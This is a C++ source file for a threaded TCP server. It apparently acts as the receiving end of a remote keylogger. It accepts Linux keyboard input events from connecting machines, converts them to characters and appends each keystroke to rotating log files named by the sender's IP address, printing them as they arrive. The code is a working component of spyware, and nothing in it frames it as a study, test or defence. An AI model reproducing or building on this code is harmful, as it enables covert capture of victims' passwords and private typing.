#include "pch.h"

mutex file_mutex;

/*
This function handles client connection.
input:
socket - the client socket.
output: null.
*/
void client_handler(int socket) {
    struct input_event event;
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    string filename;
    fstream file;
    char code = 0;

    //get the client's IP address
    if (getpeername(socket, (struct sockaddr*)&client_addr, &addr_len) == -1) {
        std::cerr << "getpeername failed" << std::endl;
        close(socket);
        return;
    }

    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(client_addr.sin_addr), ip_str, INET_ADDRSTRLEN);
    std::string ip = ip_str;

    //read struct input_event from the client
    if (read(socket, &event, sizeof(struct input_event)) <= 0) {
        std::cerr << "Error reading from socket" << std::endl;
        close(socket);
        return;
    }

    for (int i = 0; i < MAX_LOG_FILES; ++i) {
        //generate log file name
        filename = LOG_DIRECTORY + ip + "-log" + std::to_string(i) + ".txt";

        lock_guard<mutex> lock(file_mutex);

        //ppen file in append mode
        file.open(filename, std::ios::in | std::ios::out | std::ios::app);
        if (!file.is_open()) {
            //if file doesn't exist, create it
            std::ofstream new_file(filename);
            new_file.close();
            file.open(filename, std::ios::in | std::ios::out | std::ios::app);
        }

        //check if the file has space left
        file.seekp(0, std::ios::end);
        if (file.tellp() < LOG_FILE_SIZE)
            break;

        file.close();
    }

    if (!file.is_open()) {
        cerr << "Failed to open log file" << endl;
        close(socket);
        return;
    }

    //check if key is released or pressed
    code = (event.value == 1) ? event.code : (event.code | RELEASE_CODE);

    //get char from key event
    key_event key = keyboard_handler(code);
    if (event.type == EV_KEY) {
        if(is_ascii(key_to_ascii(key))){
            file << key_to_ascii(key);
            cout << "IP: " << ip << ", Key: " << key_to_ascii(key) << endl;
        }
    }

    file.close();
    close(socket);
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    int opt = 1;

    //init keyboard chars
    keyboard_init();

    //create the socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        std::cerr << "Socket creation failed" << std::endl;
        return 1;
    }

    //attach socket to the port
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        std::cerr << "setsockopt failed" << std::endl;
        return 1;
    }

    //socket address details
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    //bind the socket port
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        cerr << "Bind failed" << endl;
        return 1;
    }

    //start listening...
    if (listen(server_fd, 3) < 0) {
        cerr << "Listen failed" << endl;
        return 1;
    }

    cout << "Server is running on port " << PORT << endl;

    while (true) {
        //accept incoming connection
        if ((new_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0) {
            cerr << "Accept failed" << endl;
            continue;
        }

        //handle the client in a separate thread
        thread client_thread(client_handler, new_socket);
        client_thread.detach();
    }

    return 0;
}
